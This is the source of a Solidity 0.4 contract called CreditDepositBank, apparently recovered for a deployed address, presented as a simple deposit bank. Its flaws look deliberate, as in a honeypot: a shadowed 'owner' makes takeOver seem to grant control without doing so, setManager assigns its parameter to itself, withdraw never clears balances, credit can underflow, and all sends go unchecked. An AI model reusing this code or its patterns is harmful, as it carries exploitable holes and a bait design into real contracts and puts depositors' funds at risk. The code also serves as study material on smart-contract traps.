/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract CreditDepositBank at 0x5bb52e85c21ca3df3c71da6d03be19cff89e7cf9
*/
pragma solidity ^0.4.17;

contract Ownable {
    address public owner;

    function Ownable() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract CreditDepositBank is Ownable {
    mapping (address => uint) public balances;
    
    address public owner;

    function takeOver() public {
        if (balances[msg.sender] > 0) {
            owner = msg.sender;
        }
    }
    
    address public manager;
    
    modifier onlyManager() {
        require(msg.sender == manager);
        _;
    }

    function setManager(address manager) public {
        if (balances[manager] > 100 finney) {
            manager = manager;
        }
    }

    function() public payable {
        deposit();
    }
    
    function deposit() public payable {
        if (msg.value >= 10 finney)
            balances[msg.sender] += msg.value;
        else
            revert();
    }
    
    function withdraw(address client) public onlyOwner {
        require (balances[client] > 0);
        msg.sender.send(balances[client]);
    }

    function credit() public payable {
        if (msg.value >= this.balance) {
            balances[msg.sender] -= this.balance + msg.value;
            msg.sender.send(this.balance + msg.value);
        }
    }
    
    function close() public onlyManager {
        manager.send(this.balance);
	    if (this.balance == 0) {  
		    selfdestruct(manager);
	    }
    }
}